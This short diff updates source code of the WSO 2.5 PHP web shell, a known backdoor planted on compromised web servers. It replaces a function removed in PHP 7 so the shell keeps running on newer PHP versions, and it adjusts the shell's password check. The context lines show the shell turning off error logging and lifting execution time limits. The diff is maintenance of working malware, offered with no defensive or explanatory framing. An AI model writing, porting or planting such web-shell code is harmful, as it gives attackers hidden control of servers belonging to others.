@@ -17,7 +17,10 @@ if(!empty($_SERVER['HTTP_USER_AGENT'])) {
 @ini_set('log_errors',0);
 @ini_set('max_execution_time',0);
 @set_time_limit(0);
-@set_magic_quotes_runtime(0);
+
+//@set_magic_quotes_runtime(0); // This function was REMOVED as of PHP 7.0.0.
+@ini_set('magic_quotes_runtime', 0);
+
 @define('WSO_VERSION', '2.5');
 
 if(get_magic_quotes_gpc()) {
@@ -38,6 +41,7 @@ function WSOsetcookie($k, $v) {
 }
 
 if(!empty($auth_pass)) {
+    $auth_pass = strtolower($auth_pass);
     if(isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass))
         WSOsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);
 
